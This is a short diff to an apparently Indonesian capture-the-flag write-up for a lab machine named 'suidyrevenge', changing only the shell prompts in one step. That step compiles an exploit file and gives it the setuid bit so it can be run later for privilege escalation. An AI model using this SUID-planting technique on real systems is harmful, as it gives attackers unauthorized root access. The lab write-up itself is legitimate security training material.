@@ -214,10 +214,10 @@ void main() {
 ```
 lalu saya compile dan saya beri izin `executable` agar nanti bisa dieksekusi.
 ```
-suidy@suidyrevenge:/home/suidy# gcc exploit.c -o exploit.o
-suidy@suidyrevenge:/home/suidy# mv exploit.o suidyyyyy
-suidy@suidyrevenge:/home/suidy# chmod 4755 suidyyyyy
-suidy@suidyrevenge:/home/suidy# ls -la | grep "suidyyyyy"
+suidy@suidyrevenge:/home/suidy$ gcc exploit.c -o exploit.o
+suidy@suidyrevenge:/home/suidy$ mv exploit.o suidyyyyy
+suidy@suidyrevenge:/home/suidy$ chmod 4755 suidyyyyy
+suidy@suidyrevenge:/home/suidy$ ls -la | grep "suidyyyyy"
 -rwsr-sr-x 1 suidy theuser  16664 Nov  4 15:13 suidyyyyy
 ```
 in other words, i be waiting for the time with `pspy64`.
